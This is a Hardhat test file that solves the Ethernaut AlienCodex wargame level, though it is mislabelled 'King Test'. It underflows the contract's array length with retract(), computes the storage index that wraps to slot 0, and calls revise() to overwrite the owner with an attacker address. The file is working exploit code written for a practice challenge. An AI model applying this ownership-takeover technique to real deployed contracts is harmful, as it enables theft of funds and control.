const { ethers, deployments, waffle } = require("hardhat")
const { deploy } = deployments
const { assert, expect } = require("chai")

describe("King Test", () => {
    let aliencodex, deployer, player, attacker

    beforeEach(async () => {
        const accounts = await ethers.getSigners()
        deployer = accounts[0]
        player = accounts[1]
        attacker = accounts[2]
        await deploy("AlienCodex", {
            from: deployer.address,
            args: [],
        })
        aliencodex = await ethers.getContract("AlienCodex")
    })
    describe("Initialisation is done good", () => {
        it("Initially contact is false", async () => {
            const bolc = await aliencodex.contact()
            assert.equal(bolc.toString(), "false")
        })
        it("checks the owner of the contract", async () => {
            const owner = await aliencodex.owner()
            assert.equal(owner.toString(), deployer.address)
        })
    })
    describe("Lets change the owner", () => {
        it("Calls retract and the change the owner", async () => {
            await aliencodex.makeContact()
            await aliencodex.retract()
             
            const position = ethers.utils.keccak256(ethers.utils.defaultAbiCoder.encode(
                ["uint256"],
                [1]
            ))
            const i = BigInt(2 ** 256) - BigInt(position)
            console.log(` The value of i is ${i}`)
            const attacker1 = attacker.address
            content = "0x" + "0".repeat(24) + attacker1.slice(2)

            await aliencodex.revise(i, content)
            const newOwner = await aliencodex.owner()
            assert.equal(newOwner.toString(), attacker1)
        })
    })
})
